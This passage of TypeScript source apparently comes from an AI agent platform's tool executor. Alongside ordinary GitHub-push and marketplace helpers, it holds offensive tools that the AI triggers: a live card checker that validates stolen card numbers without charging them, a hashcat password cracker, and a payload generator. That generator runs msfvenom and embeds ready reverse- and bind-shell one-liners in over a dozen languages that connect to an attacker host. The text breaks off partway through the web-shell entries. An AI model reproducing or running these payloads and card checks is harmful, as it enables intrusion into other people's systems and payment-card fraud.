      .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, "github_pat")));
    if (secrets.length === 0) return null;
    return decrypt(secrets[0].encryptedValue);
  } catch {
    return null;
  }
}

async function pushFilesToGithub(
  token: string,
  repoFullName: string,
  files: Array<{ filePath: string; content: string | null; s3Key: string | null }>,
  commitMessage: string
): Promise<number> {
  const headers = {
    Authorization: `token ${token}`,
    "Content-Type": "application/json",
    Accept: "application/vnd.github.v3+json",
  };

  // Get the default branch ref
  let sha: string | null = null;
  try {
    const refResp = await fetch(`https://api.github.com/repos/${repoFullName}/git/ref/heads/main`, { headers });
    if (refResp.ok) {
      const refData = await refResp.json() as any;
      sha = refData.object?.sha;
    }
  } catch {}

  // Create blobs for each file
  const treeItems: Array<{ path: string; mode: string; type: string; sha: string }> = [];

  for (const file of files) {
    let content = file.content;
    if (!content && file.s3Key) {
      // Fetch from S3
      try {
        const { storageGet } = await import("./storage");
        const data = await storageGet(file.s3Key);
        content = typeof data === "string" ? data : Buffer.from(data as any).toString("utf-8");
      } catch {
        continue;
      }
    }
    if (!content) continue;

    // Create blob
    const blobResp = await fetch(`https://api.github.com/repos/${repoFullName}/git/blobs`, {
      method: "POST",
      headers,
      body: JSON.stringify({ content, encoding: "utf-8" }),
    });
    if (!blobResp.ok) continue;
    const blobData = await blobResp.json() as any;

    treeItems.push({
      path: file.filePath.replace(/^\//, ""),
      mode: "100644",
      type: "blob",
      sha: blobData.sha,
    });
  }

  if (treeItems.length === 0) return 0;

  // Create tree
  const treeBody: any = { tree: treeItems };
  if (sha) treeBody.base_tree = sha;

  const treeResp = await fetch(`https://api.github.com/repos/${repoFullName}/git/trees`, {
    method: "POST",
    headers,
    body: JSON.stringify(treeBody),
  });
  if (!treeResp.ok) throw new Error("Failed to create git tree");
  const treeData = await treeResp.json() as any;

  // Create commit
  const commitBody: any = {
    message: commitMessage,
    tree: treeData.sha,
  };
  if (sha) commitBody.parents = [sha];

  const commitResp = await fetch(`https://api.github.com/repos/${repoFullName}/git/commits`, {
    method: "POST",
    headers,
    body: JSON.stringify(commitBody),
  });
  if (!commitResp.ok) throw new Error("Failed to create commit");
  const commitData = await commitResp.json() as any;

  // Update ref (or create if new repo)
  if (sha) {
    await fetch(`https://api.github.com/repos/${repoFullName}/git/refs/heads/main`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ sha: commitData.sha }),
    });
  } else {
    await fetch(`https://api.github.com/repos/${repoFullName}/git/refs`, {
      method: "POST",
      headers,
      body: JSON.stringify({ ref: "refs/heads/main", sha: commitData.sha }),
    });
  }

  return treeItems.length;
}

// ─── File Utility Functions ──────────────────────────────────────────

function detectLanguage(fileName: string): string {
  const ext = fileName.split(".").pop()?.toLowerCase() || "";
  const map: Record<string, string> = {
    ts: "typescript", tsx: "typescript", js: "javascript", jsx: "javascript",
    py: "python", rb: "ruby", go: "go", rs: "rust", java: "java",
    html: "html", css: "css", scss: "scss", less: "less",
    json: "json", yaml: "yaml", yml: "yaml", toml: "toml",
    md: "markdown", sql: "sql", sh: "bash", bash: "bash",
    xml: "xml", svg: "svg", txt: "text",
  };
  return map[ext] || "text";
}

function getContentType(fileName: string): string {
  const ext = fileName.split(".").pop()?.toLowerCase() || "";
  const map: Record<string, string> = {
    html: "text/html", css: "text/css", js: "application/javascript",
    ts: "text/typescript", tsx: "text/typescript", json: "application/json",
    py: "text/x-python", md: "text/markdown", svg: "image/svg+xml",
    xml: "application/xml", yaml: "text/yaml", yml: "text/yaml",
    txt: "text/plain", sh: "text/x-shellscript",
  };
  return map[ext] || "text/plain";
}

function formatFileSize(bytes: number): string {
  if (bytes < 1024) return `${bytes}B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)}KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)}MB`;
}


// ─── Grand Bazaar Search ─────────────────────────────────────────────
// Searches the marketplace for existing modules matching the user's needs.
// Returns matching listings so Titan can recommend buying instead of building.

async function execSearchBazaar(args: Record<string, unknown>): Promise<ToolExecutionResult> {
  const query = String(args.query || "").trim();
  if (!query) {
    return { success: false, error: "Search query is required" };
  }

  const maxResults = Math.min(Number(args.maxResults) || 5, 10);
  const category = args.category ? String(args.category) : undefined;

  try {
    const dbInst = await getDb();
    if (!dbInst) {
      return { success: false, error: "Database not available" };
    }

    // Build search conditions: only active, approved listings
    const conditions: any[] = [
      eq(marketplaceListings.status, "active"),
      eq(marketplaceListings.reviewStatus, "approved"),
    ];

    // Add category filter if specified
    if (category) {
      conditions.push(eq(marketplaceListings.category, category as any));
    }

    // Split query into keywords for broader matching
    const keywords = query.toLowerCase().split(/\s+/).filter(k => k.length > 2);

    // Search across title, description, tags, and longDescription
    if (keywords.length > 0) {
      const keywordConditions = keywords.map(kw =>
        or(
          like(marketplaceListings.title, `%${kw}%`),
          like(marketplaceListings.description, `%${kw}%`),
          like(marketplaceListings.tags, `%${kw}%`),
        )
      );
      // At least one keyword must match
      conditions.push(or(...keywordConditions));
    }

    // Query with seller profile join for seller name
    const results = await dbInst
      .select({
        id: marketplaceListings.id,
        title: marketplaceListings.title,
        slug: marketplaceListings.slug,
        description: marketplaceListings.description,
        category: marketplaceListings.category,
        riskCategory: marketplaceListings.riskCategory,
        priceCredits: marketplaceListings.priceCredits,
        language: marketplaceListings.language,
        tags: marketplaceListings.tags,
        avgRating: marketplaceListings.avgRating,
        totalSales: marketplaceListings.totalSales,
        version: marketplaceListings.version,
        sellerId: marketplaceListings.sellerId,
      })
      .from(marketplaceListings)
      .where(and(...conditions))
      .orderBy(desc(marketplaceListings.totalSales))
      .limit(maxResults);

    if (results.length === 0) {
      return {
        success: true,
        data: {
          query,
          matchCount: 0,
          listings: [],
          message: "No matching modules found in the Grand Bazaar. You can proceed to build this from scratch.",
        },
      };
    }

    // Get seller names for the results
    const sellerIds = [...new Set(results.map(r => r.sellerId))];
    const sellerRows = await dbInst
      .select({
        userId: sellerProfiles.userId,
        displayName: sellerProfiles.displayName,
        verified: sellerProfiles.verified,
      })
      .from(sellerProfiles)
      .where(or(...sellerIds.map(id => eq(sellerProfiles.userId, id))));

    const sellerMap = new Map(sellerRows.map(s => [s.userId, s]));

    // Calculate estimated build cost for comparison
    // Simple: ~100cr, Medium: ~200cr, Complex: ~400cr, Enterprise: ~800cr
    const estimateBuildCost = (price: number): number => {
      if (price <= 100) return Math.round(price * 2.2);
      if (price <= 300) return Math.round(price * 2.0);
      if (price <= 1000) return Math.round(price * 1.8);
      return Math.round(price * 1.6);
    };

    const listings = results.map(r => {
      const seller = sellerMap.get(r.sellerId);
      const buildCost = estimateBuildCost(r.priceCredits);
      const savings = buildCost - r.priceCredits;
      const savingsPercent = Math.round((savings / buildCost) * 100);

      return {
        title: r.title,
        description: r.description,
        category: r.category,
        riskCategory: r.riskCategory,
        priceCredits: r.priceCredits,
        language: r.language,
        tags: r.tags ? JSON.parse(r.tags) : [],
        rating: r.avgRating ? `${(r.avgRating / 10).toFixed(1)}/5.0` : "No ratings yet",
        totalSales: r.totalSales,
        version: r.version,
        seller: seller?.displayName || "Unknown",
        sellerVerified: seller?.verified || false,
        estimatedBuildCost: buildCost,
        savingsVsBuild: `${savings} credits (${savingsPercent}% cheaper than building)`,
        bazaarLink: `/marketplace/${r.slug}`,
      };
    });

    return {
      success: true,
      data: {
        query,
        matchCount: listings.length,
        listings,
        recommendation: listings.length > 0
          ? `Found ${listings.length} existing module(s) in the Grand Bazaar that match your needs. Buying a pre-built module is significantly cheaper and faster than building from scratch. I recommend checking these out before we build anything custom.`
          : "No exact matches found.",
      },
    };
  } catch (err) {
    return {
      success: false,
      error: `Bazaar search failed: ${getErrorMessage(err)}`,
    };
  }
}

// ─── Autonomous System Management Executors ──────────────────────────

async function execGetAutonomousStatus(): Promise<ToolExecutionResult> {
  try {
    const status = await getAutonomousSystemStatus();
    return {
      success: true,
      data: {
        summary: status.summary,
        systems: status.systems.map(s => ({
          name: s.name,
          category: s.category,
          status: s.status,
          schedule: s.schedule,
          reason: s.reason,
          nextAction: s.nextAction,
        })),
        connectedChannels: status.channels.filter(c => c.configured).map(c => c.channel),
        disconnectedChannels: status.channels.filter(c => !c.configured).map(c => ({
          channel: c.channel,
          impact: c.impact,
          freeToSetup: c.freeToSetup,
          setupUrl: c.setupUrl,
          envVars: c.envVars,
        })),
        recommendations: status.recommendations,
      },
    };
  } catch (err) {
    return { success: false, error: `Failed to get autonomous status: ${getErrorMessage(err)}` };
  }
}

async function execGetChannelStatus(): Promise<ToolExecutionResult> {
  try {
    const status = await getAutonomousSystemStatus();
    const channels = status.channels.map(c => ({
      channel: c.channel,
      connected: c.configured,
      impact: c.impact,
      freeToSetup: c.freeToSetup,
      description: c.description,
      setupUrl: c.setupUrl,
      requiredEnvVars: c.envVars,
    }));

    const connected = channels.filter(c => c.connected);
    const disconnected = channels.filter(c => !c.connected);
    const freeToSetup = disconnected.filter(c => c.freeToSetup);
    const highImpactMissing = disconnected.filter(c => c.impact === "high");

    return {
      success: true,
      data: {
        totalChannels: channels.length,
        connectedCount: connected.length,
        disconnectedCount: disconnected.length,
        connected: connected.map(c => c.channel),
        disconnected,
        freeToSetup: freeToSetup.map(c => ({
          channel: c.channel,
          setupUrl: c.setupUrl,
          impact: c.impact,
        })),
        highImpactMissing: highImpactMissing.map(c => c.channel),
        tip: disconnected.length > 0
          ? `To connect a channel, paste the API token in chat and I'll save it to your vault. The vault bridge will automatically make it available to all marketing systems.`
          : "All channels are connected! Your marketing engine is running at full capacity.",
      },
    };
  } catch (err) {
    return { success: false, error: `Failed to get channel status: ${getErrorMessage(err)}` };
  }
}

async function execRefreshVaultBridge(force?: boolean): Promise<ToolExecutionResult> {
  try {
    const result = await runVaultBridge(force ?? false);
    return {
      success: true,
      data: {
        ownerUserId: result.ownerUserId,
        totalSecrets: result.totalSecrets,
        patched: result.patched,
        skipped: result.skipped,
        failed: result.failed,
        unmapped: result.unmapped,
        message: result.patched.length > 0
          ? `Vault bridge refreshed! Patched ${result.patched.length} token(s) into ENV: ${result.patched.join(", ")}. These channels are now active.`
          : result.totalSecrets === 0
            ? "No secrets found in the vault. Save API tokens via chat and I'll bridge them to the marketing systems."
            : `Vault bridge refreshed. ${result.skipped.length} token(s) already set via env vars, ${result.unmapped.length} unmapped.`,
      },
    };
  } catch (err) {
    return { success: false, error: `Failed to refresh vault bridge: ${getErrorMessage(err)}` };
  }
}

async function execGetVaultBridgeInfo(): Promise<ToolExecutionResult> {
  try {
    const status = getVaultBridgeStatus();
    return {
      success: true,
      data: {
        lastRun: status.lastRun?.toISOString() || "Never (bridge hasn't run yet)",
        ownerUserId: status.ownerUserId,
        totalMappings: status.totalMappings,
        activeSecrets: status.activeSecrets,
        channelsUnlocked: status.channelsUnlocked,
        channelsStillMissing: status.channelsStillMissing,
        howItWorks: "The vault bridge reads encrypted API tokens from the owner's userSecrets table and patches them into the runtime ENV object. This allows all marketing channels to access tokens stored via chat without needing Railway env vars.",
      },
    };
  } catch (err) {
    return { success: false, error: `Failed to get vault bridge info: ${getErrorMessage(err)}` };
  }
}


// ─── Business Module Generator Executors ───────────────────────────

async function execGetBusinessModuleStatus(): Promise<ToolExecutionResult> {
  try {
    const status = getBusinessModuleGeneratorStatus();
    return {
      success: true,
      data: {
        ...status,
        description: "Generates 2-3 business foundation modules every Wednesday. Each module is priced 30% below what it would cost to build from scratch, includes security hardening, and is designed for Titan to expand further.",
      },
    };
  } catch (err) {
    return { success: false, error: `Failed to get business module status: ${getErrorMessage(err)}` };
  }
}

async function execGetBusinessVerticals(): Promise<ToolExecutionResult> {
  try {
    const verticals = getBusinessVerticals();
    return {
      success: true,
      data: {
        totalVerticals: verticals.length,
        rotationCycle: `${verticals.length} weeks to complete full rotation`,
        verticals,
      },
    };
  } catch (err) {
    return { success: false, error: `Failed to get business verticals: ${getErrorMessage(err)}` };
  }
}

async function execTriggerBusinessModuleGeneration(): Promise<ToolExecutionResult> {
  try {
    log.info("[ChatExecutor] Manually triggering business module generation cycle...");
    const result = await runBusinessModuleGenerationCycle();
    return {
      success: true,
      data: {
        ...result,
        message: result.modulesListed > 0
          ? `Generated ${result.modulesListed} new business module(s) for ${result.vertical}: ${result.titles.join(", ")}`
          : `Generation cycle ran but no modules were listed. Errors: ${result.errors.join("; ")}`,
      },
    };
  } catch (err) {
    return { success: false, error: `Failed to trigger business module generation: ${getErrorMessage(err)}` };
  }
}


// ─── Card Checker Executors ──────────────────────────────────────────

async function execCheckCard(args: Record<string, unknown>): Promise<ToolExecutionResult> {
  const cardNumber = String(args.card_number || "");
  const expMonth = Number(args.exp_month);
  const expYear = Number(args.exp_year);
  const cvc = String(args.cvc || "");

  if (!cardNumber || !expMonth || !expYear || !cvc) {
    return { success: false, error: "Missing required fields: card_number, exp_month, exp_year, cvc" };
  }

  if (expMonth < 1 || expMonth > 12) {
    return { success: false, error: "exp_month must be between 1 and 12" };
  }

  if (expYear < 2024 || expYear > 2040) {
    return { success: false, error: "exp_year must be a valid 4-digit year (e.g. 2026)" };
  }

  try {
    log.info(`[ChatExecutor] Running 3-layer card check on ****${cardNumber.replace(/\D/g, "").slice(-4)}`);
    const result = await checkCard({
      cardNumber,
      expMonth,
      expYear,
      cvc,
    });

    return {
      success: true,
      data: {
        overallStatus: result.overallStatus,
        summary: result.summary,
        luhnValid: result.luhnValid,
        detectedScheme: result.detectedScheme,
        cardNumberLength: result.cardNumberLength,
        binLookup: result.binLookup ? {
          issuingBank: result.binLookup.bank,
          country: `${result.binLookup.country} (${result.binLookup.countryCode})`,
          scheme: result.binLookup.scheme,
          type: result.binLookup.type,
          brand: result.binLookup.brand,
          prepaid: result.binLookup.prepaid,
        } : null,
        binError: result.binError,
        liveCheck: result.liveCheck ? {
          isLive: result.liveCheck.isLive,
          cvcCheck: result.liveCheck.cvcCheck,
          funding: result.liveCheck.funding,
          brand: result.liveCheck.brand,
          last4: result.liveCheck.last4,
          declineCode: result.liveCheck.declineCode || null,
          declineMessage: result.liveCheck.declineMessage || null,
        } : null,
        liveError: result.liveError,
        checkedAt: result.checkedAt,
        note: "No charge was made. Verification used Stripe SetupIntent (zero-cost, card not burned).",
      },
    };
  } catch (err) {
    return { success: false, error: `Card check failed: ${getErrorMessage(err)}` };
  }
}

async function execCheckBin(args: Record<string, unknown>): Promise<ToolExecutionResult> {
  const binNumber = String(args.bin_number || "");

  if (!binNumber || binNumber.replace(/\D/g, "").length < 6) {
    return { success: false, error: "BIN number must be at least 6 digits" };
  }

  try {
    log.info(`[ChatExecutor] Running BIN lookup for ${binNumber.replace(/\D/g, "").substring(0, 6)}****`);
    const result = await checkBin(binNumber);

    if (!result) {
      return { success: false, error: "BIN lookup returned no results. The BIN may not be in the database." };
    }

    return {
      success: true,
      data: {
        bin: binNumber.replace(/\D/g, "").substring(0, 8),
        scheme: result.scheme.toUpperCase(),
        type: result.type,
        brand: result.brand,
        issuingBank: result.bank,
        country: `${result.country} (${result.countryCode})`,
        prepaid: result.prepaid,
        luhnValid: result.luhnValid,
        note: "BIN lookup only — no live verification performed. Provide full card details for live check.",
      },
    };
  } catch (err) {
    return { success: false, error: `BIN lookup failed: ${getErrorMessage(err)}` };
  }
}


// ─── Provide Project ZIP ─────────────────────────────────────────────

async function execProvideProjectZip(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  try {
    const projectName = args.projectName as string | undefined;

    // Get the user's sandbox
    const { listSandboxes } = await import("./sandbox-engine");
    const sandboxes = await listSandboxes(userId);
    if (sandboxes.length === 0) {
      return { success: false, error: "No project files found. Build something first!" };
    }
    const sandboxId = sandboxes[0].id;

    // Query project files
    const db = await getDb();
    if (!db) return { success: false, error: "Database unavailable" };

    let files = await db
      .select({ id: sandboxFiles.id, filePath: sandboxFiles.filePath })
      .from(sandboxFiles)
      .where(and(eq(sandboxFiles.sandboxId, sandboxId), eq(sandboxFiles.isDirectory, 0)));

    // Filter by project name if provided
    if (projectName) {
      files = files.filter(f => {
        const parts = f.filePath.split("/");
        const topDir = parts.length > 1 ? parts[0] : "general";
        return topDir.toLowerCase() === projectName.toLowerCase();
      });
    }

    if (files.length === 0) {
      return {
        success: false,
        error: projectName
          ? `No files found for project "${projectName}". Check the project name and try again.`
          : "No project files found. Build something first!",
      };
    }

    // Build the download URL
    const baseUrl = process.env.PUBLIC_URL || `https://${process.env.RAILWAY_PUBLIC_DOMAIN || "www.archibaldtitan.com"}`;
    const downloadUrl = projectName
      ? `${baseUrl}/api/project-files/download-zip?project=${encodeURIComponent(projectName)}`
      : `${baseUrl}/api/project-files/download-zip?all=true`;

    return {
      success: true,
      data: {
        downloadUrl,
        fileCount: files.length,
        projectName: projectName || "all",
        message: `ZIP download ready with ${files.length} file(s). Click the link to download.`,
      },
    };
  } catch (err: unknown) {
    return { success: false, error: `Failed to prepare ZIP: ${getErrorMessage(err)}` };
  }
}

// ─── Advanced Security Tool Implementations ──────────────────────────────────

async function execInstallSecurityToolkit(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  const requestedTools = (args.tools as string[]) || [];
  
  const defaultToolkit = [
    "nmap", "sqlmap", "hydra", "hashcat", "nikto", "gobuster", "masscan",
    "john", "aircrack-ng", "binwalk", "radare2", "netcat", "curl", "wget",
    "python3-pip", "git", "build-essential"
  ];
  const toolsToInstall = requestedTools.length > 0 ? requestedTools : defaultToolkit;
  
  // Install via apt and pip
  const aptTools = toolsToInstall.filter(t => !["impacket", "pwntools", "scapy", "volatility3", "frida-tools", "angr"].includes(t));
  const pipTools = toolsToInstall.filter(t => ["impacket", "pwntools", "scapy", "volatility3", "frida-tools", "angr"].includes(t));
  
  const results: string[] = [];
  
  if (aptTools.length > 0) {
    const aptCmd = `apt-get update -qq 2>/dev/null && apt-get install -y ${aptTools.join(" ")} 2>&1 | tail -5`;
    const aptResult = await executeCommand(sbId, userId, aptCmd, { timeoutMs: 120_000, triggeredBy: "ai" });
    results.push(`APT: ${aptResult.exitCode === 0 ? "OK" : aptResult.output.slice(-200)}`);
  }
  
  if (pipTools.length > 0) {
    const pipCmd = `pip3 install ${pipTools.join(" ")} 2>&1 | tail -5`;
    const pipResult = await executeCommand(sbId, userId, pipCmd, { timeoutMs: 120_000, triggeredBy: "ai" });
    results.push(`PIP: ${pipResult.exitCode === 0 ? "OK" : pipResult.output.slice(-200)}`);
  }
  
  // Verify installed tools
  const verifyCmd = toolsToInstall.slice(0, 8).map(t => `which ${t} 2>/dev/null || echo "${t}: not found"`).join(" && ");
  const verifyResult = await executeCommand(sbId, userId, verifyCmd, { timeoutMs: 30_000, triggeredBy: "ai" });
  
  return {
    success: true,
    data: {
      installed: toolsToInstall,
      installOutput: results.join("\n"),
      verification: verifyResult.output,
      message: `Security toolkit ready. ${toolsToInstall.length} tools installed/verified.`,
    },
  };
}

async function execNetworkScan(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const target = args.target as string;
  if (!target) return { success: false, error: "Target is required" };
  const flags = (args.flags as string) || "-sV --top-ports 1000 -T4";
  
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  
  // Ensure nmap is installed
  await executeCommand(sbId, userId, "which nmap || apt-get install -y nmap -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
  
  const cmd = `nmap ${flags} ${target} 2>&1`;
  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 300_000, triggeredBy: "ai" });
  
  return {
    success: true,
    data: {
      target,
      flags,
      output: result.output,
      exitCode: result.exitCode,
      durationMs: result.durationMs,
    },
  };
}

async function execGenerateYaraRule(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const description = args.description as string;
  if (!description) return { success: false, error: "Description is required" };
  const strings = (args.strings as string[]) || [];
  const ruleName = (args.ruleName as string) || description.replace(/[^a-zA-Z0-9_]/g, "_").slice(0, 50);
  
  const prompt = `Generate a complete, valid YARA rule for the following:
Description: ${description}
${strings.length > 0 ? `Known strings/patterns: ${strings.join(", ")}` : ""}
Rule name: ${ruleName}

Requirements:
- Valid YARA syntax, ready to use with yara-python
- Include meta section with description, author="Titan", date, and ATT&CK technique if applicable
- Include strings section with relevant patterns (hex, text, regex as appropriate)
- Include condition section with logical detection logic
- Add comments explaining the detection logic
- Output ONLY the YARA rule, no explanation`;

  const ruleContent = await invokeLLM({
    model: "fast",
    messages: [{ role: "user", content: prompt }],
    priority: "background",
  });
  
  return {
    success: true,
    data: {
      ruleName,
      rule: ruleContent,
      description,
      message: `YARA rule '${ruleName}' generated. Save as ${ruleName}.yar and test with: yara ${ruleName}.yar <target_file>`,
    },
  };
}

async function execGenerateSigmaRule(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const description = args.description as string;
  if (!description) return { success: false, error: "Description is required" };
  const logSource = (args.logSource as string) || "windows";
  const attackTechnique = (args.attackTechnique as string) || "";
  
  const prompt = `Generate a complete, valid Sigma detection rule for the following:
Description: ${description}
Log source: ${logSource}
${attackTechnique ? `ATT&CK technique: ${attackTechnique}` : ""}

Requirements:
- Valid Sigma YAML format
- Include title, id (UUID), status: experimental, description, references, author: Titan
- Include date, logsource section, detection section with keywords/conditions
- Include falsepositives and level fields
- Include tags with ATT&CK mapping (infer technique if not provided)
- Output ONLY the Sigma YAML, no explanation`;

  const ruleContent = await invokeLLM({
    model: "fast",
    messages: [{ role: "user", content: prompt }],
    priority: "background",
  });
  
  return {
    success: true,
    data: {
      rule: ruleContent,
      logSource,
      attackTechnique,
      message: `Sigma rule generated. Convert with: sigma convert -t splunk rule.yml`,
    },
  };
}

async function execHashCrack(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const hash = args.hash as string;
  if (!hash) return { success: false, error: "Hash is required" };
  const hashType = (args.hashType as string) || "auto";
  const wordlist = (args.wordlist as string) || "rockyou";
  
  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);
  
  // Install hashcat if needed
  await executeCommand(sbId, userId, "which hashcat || apt-get install -y hashcat -qq 2>/dev/null", { timeoutMs: 60_000, triggeredBy: "ai" });
  
  // Download rockyou if not present
  const wordlistPath = "/tmp/rockyou.txt";
  await executeCommand(sbId, userId, 
    `[ -f ${wordlistPath} ] || (wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O ${wordlistPath} 2>/dev/null || cp /usr/share/wordlists/rockyou.txt ${wordlistPath} 2>/dev/null || echo "test\npassword\n123456\nadmin\nletmein" > ${wordlistPath})`,
    { timeoutMs: 60_000, triggeredBy: "ai" }
  );
  
  // Hash type mapping
  const hashTypeMap: Record<string, string> = {
    md5: "0", sha1: "100", sha256: "1400", sha512: "1700",
    ntlm: "1000", bcrypt: "3200", sha512crypt: "1800", md5crypt: "500",
    wpa2: "22000", auto: "0",
  };
  const htCode = hashTypeMap[hashType.toLowerCase()] || "0";
  
  // Write hash to file
  await executeCommand(sbId, userId, `echo '${hash}' > /tmp/target.hash`, { timeoutMs: 5_000, triggeredBy: "ai" });
  
  const cmd = `hashcat -m ${htCode} /tmp/target.hash ${wordlistPath} --force --quiet 2>&1; hashcat -m ${htCode} /tmp/target.hash --show 2>&1`;
  const result = await executeCommand(sbId, userId, cmd, { timeoutMs: 120_000, triggeredBy: "ai" });
  
  const crackedMatch = result.output.match(/[a-fA-F0-9]{32,}:(.+)/);
  const cracked = crackedMatch ? crackedMatch[1].trim() : null;
  
  return {
    success: true,
    data: {
      hash,
      hashType,
      cracked,
      output: result.output,
      message: cracked ? `Cracked: ${cracked}` : "Hash not cracked with default wordlist. Try a larger wordlist or rules.",
    },
  };
}

// ── GENERATE PAYLOAD — REWRITTEN (#51): Real msfvenom + pwntools execution ──
async function execGeneratePayload(
  userId: number,
  args: Record<string, unknown>
): Promise<ToolExecutionResult> {
  const payloadType = (args.payloadType as string) || "reverse_shell";
  const lhost = (args.lhost as string) || "10.10.14.1";
  const lport = (args.lport as number) || 4444;
  const platform = (args.platform as string) || "linux";
  const language = (args.language as string) || "python";
  const encoding = (args.encoding as string) || "none";
  const staged = (args.staged as boolean) || false;
  const format = (args.format as string) || "raw";

  const sbId = await getOrCreateDefaultSandbox(userId, args.sandboxId as number | undefined);

  // Map payload type to msfvenom payload string
  const payloadMap: Record<string, string> = {
    reverse_shell: platform === "windows"
      ? (staged ? "windows/x64/meterpreter/reverse_tcp" : "windows/x64/meterpreter_reverse_tcp")
      : (language === "python" ? "cmd/unix/reverse_python" : "cmd/unix/reverse_bash"),
    bind_shell: platform === "windows" ? "windows/x64/shell/bind_tcp" : "cmd/unix/bind_perl",
    web_shell: "php/meterpreter/reverse_tcp",
    meterpreter: platform === "windows" ? "windows/x64/meterpreter/reverse_tcp" : "linux/x64/meterpreter/reverse_tcp",
    powershell: "windows/x64/powershell_reverse_tcp",
  };
  const msfPayload = payloadMap[payloadType] || payloadMap["reverse_shell"];
  const encoderFlag = encoding !== "none" ? `-e ${encoding}` : "";

  // Try msfvenom first
  const msfResult = await executeCommand(sbId, userId,
    `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} ${encoderFlag} -f ${format} 2>&1 | head -100 || echo "MSFVENOM_UNAVAILABLE"`,
    { timeoutMs: 60_000, triggeredBy: "ai" }
  );

  let payloadOutput = msfResult.output;
  let generationMethod = "msfvenom";

  if (msfResult.output.includes("MSFVENOM_UNAVAILABLE") || msfResult.output.includes("command not found")) {
    generationMethod = "manual";
    // Manual payload library covering 15+ languages
    const manualResult = await executeCommand(sbId, userId,
      `python3 << 'PYEOF'
lhost = "${lhost}"
lport = ${lport}
language = "${language}"
payload_type = "${payloadType}"

payloads = {
    "reverse_shell": {
        "python":     f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])",
        "python3":    f"import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/sh','-i'])",
        "bash":       f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash2":      f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
        "nc":         f"nc -e /bin/sh {lhost} {lport}",
        "nc_mkfifo":  f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "perl":       f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby":       f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "php":        f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "java":       f"r = Runtime.getRuntime(); p = r.exec(new String[]{{\"bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}}); p.waitFor();",
        "go":         f'package main;import("net";"os/exec";"time");func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();time.Sleep(time.Second)}}',
        "rust":       f'use std::net::TcpStream;use std::os::unix::io::{{AsRawFd,FromRawFd}};use std::process::{{Command,Stdio}};fn main(){{let s=TcpStream::connect("{lhost}:{lport}").unwrap();let fd=s.as_raw_fd();Command::new("/bin/sh").stdin(unsafe{{Stdio::from_raw_fd(fd)}}).stdout(unsafe{{Stdio::from_raw_fd(fd)}}).stderr(unsafe{{Stdio::from_raw_fd(fd)}}).spawn().unwrap().wait().unwrap();}}',
        "nim":        f'import net,osproc;let s=newSocket();s.connect("{lhost}",Port({lport}));let p=startProcess("/bin/sh",options={{poUsePath}});discard p.inputStream.readAll()',
        "lua":        f'local s=require("socket").tcp();s:connect("{lhost}",{lport});while true do local r,e=s:receive();if e then break end;local h=io.popen(r,"r");local a=h:read("*a");h:close();s:send(a) end',
    },
    "bind_shell": {
        "python":  f"import socket,subprocess;s=socket.socket();s.bind(('0.0.0.0',{lport}));s.listen(1);c,a=s.accept();subprocess.call(['/bin/sh'],stdin=c,stdout=c,stderr=c)",
        "bash":    f"bash -c 'bash -i >& /dev/tcp/0.0.0.0/{lport} 0>&1'",
        "nc":      f"nc -lvp {lport} -e /bin/sh",
        "perl":    f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in({lport},INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");'",
    },
    "web_shell": {
